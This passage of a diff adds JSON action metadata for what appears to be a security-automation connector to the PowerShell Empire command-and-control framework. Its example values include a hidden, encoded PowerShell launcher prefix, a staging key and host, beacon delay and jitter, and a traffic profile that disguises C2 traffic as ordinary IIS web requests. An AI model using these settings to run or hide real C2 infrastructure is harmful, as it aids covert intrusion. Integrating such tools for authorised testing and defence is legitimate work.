+                    "data_path": "action_result.data.*.listeners.*.options.Port.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "8080"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.WorkingHours.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.WorkingHours.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Hours for the agent to operate (09:00-17:00)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.WorkingHours.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.CertPath.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.CertPath.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Certificate path for https listeners."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.CertPath.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultLostLimit.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultLostLimit.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Number of missed checkins before exiting"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultLostLimit.Value",
+                    "data_type": "numeric",
+                    "example_values": [
+                        60
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.SlackChannel.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.SlackChannel.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "The Slack channel or DM that notifications will be sent to."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.SlackChannel.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "#general"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.UserAgent.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.UserAgent.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "User-agent string to use for the staging request (default, none, or other)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.UserAgent.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "default"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.BindIP.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.BindIP.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "The IP to bind to on the control server."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.BindIP.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "0.0.0.0"
+                    ],
+                    "contains": [
+                        "ip"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultJitter.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultJitter.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Jitter in agent reachback interval (0.0-1.0)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultJitter.Value",
+                    "data_type": "numeric",
+                    "example_values": [
+                        0
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.StagingKey.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.StagingKey.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Staging key for initial agent negotiation."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.StagingKey.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "?7naSHsK{;gopLVmAR,9l^]+*hz)q/=v"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultDelay.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultDelay.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Agent delay/reach back interval (in seconds)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultDelay.Value",
+                    "data_type": "numeric",
+                    "example_values": [
+                        5
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.SlackToken.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.SlackToken.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Your SlackBot API token to communicate with your Slack instance."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.SlackToken.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Proxy.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Proxy.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Proxy to use for request (default, none, or other)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Proxy.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "default"
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.listener_module",
+                    "data_type": "string",
+                    "example_values": [
+                        "http"
+                    ],
+                    "contains": [
+                        "url"
+                    ]
+                }
+            ],
+            "render": {
+                "type": "table"
+            },
+            "versions": "EQ(*)"
+        },
+        {
+            "action": "list servers",
+            "identifier": "list_listeners",
+            "description": "Get all current listeners",
+            "verbose": "Returns all current Empire listeners.",
+            "type": "generic",
+            "read_only": true,
+            "parameters": {},
+            "output": [
+                {
+                    "data_path": "action_result.status",
+                    "data_type": "string",
+                    "example_values": [
+                        "success"
+                    ]
+                },
+                {
+                    "data_path": "action_result.message",
+                    "data_type": "string",
+                    "example_values": [
+                        "Total listeners: 1"
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects_successful",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.name",
+                    "data_type": "string",
+                    "column_name": "Listener Name",
+                    "column_order": 1,
+                    "example_values": [
+                        "http"
+                    ],
+                    "contains": [
+                        "empire listener name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.listener_category",
+                    "data_type": "string",
+                    "example_values": [
+                        "client_server"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.module",
+                    "data_type": "string",
+                    "column_name": "Listener Module",
+                    "column_order": 2,
+                    "example_values": [
+                        "http"
+                    ],
+                    "contains": [
+                        "empire listener type"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.ID",
+                    "data_type": "numeric",
+                    "column_name": "ID",
+                    "column_order": 0,
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.StagerURI.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.StagerURI.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "URI for the stager. Must use /download/. Example: /download/stager.php"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.StagerURI.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.ProxyCreds.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.ProxyCreds.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Proxy credentials ([domain\\]username:password) to use for request (default, none, or other)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.ProxyCreds.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "default"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.KillDate.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.KillDate.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Date for the listener to exit (MM/dd/yyyy)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.KillDate.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Name.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Name.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Name for the listener."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Name.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "http"
+                    ],
+                    "contains": [
+                        "empire listener name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Launcher.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Launcher.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Launcher string."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Launcher.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "powershell -noP -sta -w 1 -enc "
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultProfile.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultProfile.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Default communication profile for the agent."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultProfile.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.ServerVersion.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.ServerVersion.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Server header for the control server."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.ServerVersion.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "Microsoft-IIS/7.5"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Host.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Host.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Hostname/IP for staging."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Host.Value",
+                    "data_type": "string",
+                    "column_name": "Staging Address",
+                    "column_order": 3,
+                    "example_values": [
+                        "http://172.16.25.158:8080"
+                    ],
+                    "contains": [
+                        "url"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Port.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Port.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Port for the listener."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Port.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "8080"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.WorkingHours.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.WorkingHours.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Hours for the agent to operate (09:00-17:00)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.WorkingHours.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.CertPath.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.CertPath.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Certificate path for https listeners."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.CertPath.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultLostLimit.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultLostLimit.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Number of missed checkins before exiting"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultLostLimit.Value",
+                    "data_type": "numeric",
+                    "example_values": [
+                        60
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.SlackChannel.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.SlackChannel.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "The Slack channel or DM that notifications will be sent to."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.SlackChannel.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "#general"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.UserAgent.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.UserAgent.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "User-agent string to use for the staging request (default, none, or other)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.UserAgent.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "default"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.BindIP.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.BindIP.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "The IP to bind to on the control server."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.BindIP.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "0.0.0.0"
+                    ],
+                    "contains": [
+                        "ip"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultJitter.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultJitter.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Jitter in agent reachback interval (0.0-1.0)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultJitter.Value",
+                    "data_type": "numeric",
+                    "example_values": [
+                        0
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.StagingKey.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.StagingKey.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Staging key for initial agent negotiation."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.StagingKey.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "?7naSHsK{;gopLVmAR,9l^]+*hz)q/=v"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultDelay.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultDelay.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Agent delay/reach back interval (in seconds)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultDelay.Value",
+                    "data_type": "numeric",
+                    "example_values": [
+                        5
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.SlackToken.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.SlackToken.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Your SlackBot API token to communicate with your Slack instance."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.SlackToken.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Proxy.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Proxy.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Proxy to use for request (default, none, or other)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Proxy.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "default"
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.total_listeners",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                }
+            ],
+            "render": {
+                "type": "table"
+            },
+            "versions": "EQ(*)"
+        }
+    ]
+}
